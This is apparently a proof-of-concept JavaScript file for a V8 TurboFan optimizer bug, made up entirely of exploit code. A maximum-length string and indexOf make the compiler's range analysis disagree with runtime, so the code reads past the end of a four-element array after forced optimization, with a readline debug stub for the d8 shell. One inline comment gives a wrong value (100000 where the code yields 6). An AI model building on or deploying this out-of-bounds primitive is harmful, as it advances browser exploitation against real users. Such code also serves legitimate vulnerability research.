function gc(){
    for (var i = 0; i < 1024 * 1024 * 16; i++){
      new String();
    }
  }
  
  function clear_space(){
    gc();
    gc();
  }
  
  function debug_stub(msg){
      console.log(msg);
      readline();
  }

debug_stub("before entry");

function maxstring() {
  // force TurboFan
  try {} finally {}

  var i = 'A'.repeat(2**28 - 16).indexOf("", 2**28);
  i += 16; // real value: i = 2**28, optimizer: i = 2**28-1
  i >>= 28; // real value i = 1, optimizer: i = 0
  i *= 6; // real value i = 100000, optimizer: i = 0
  if (i > 3) {
    return 0;
  } else {
    var arr = [0.1, 0.2, 0.3, 0.4];
    console.log(arr[i]);
    return arr[i];
  }
}

function opttest() {
  // call in a loop to trigger optimization
  for (var i = 0; i < 100000; i++) {
    var o = maxstring();
    if (o == 0 || o == undefined) {
      continue;
    }
    return o;
  }
  console.log("fail");
}

opttest();
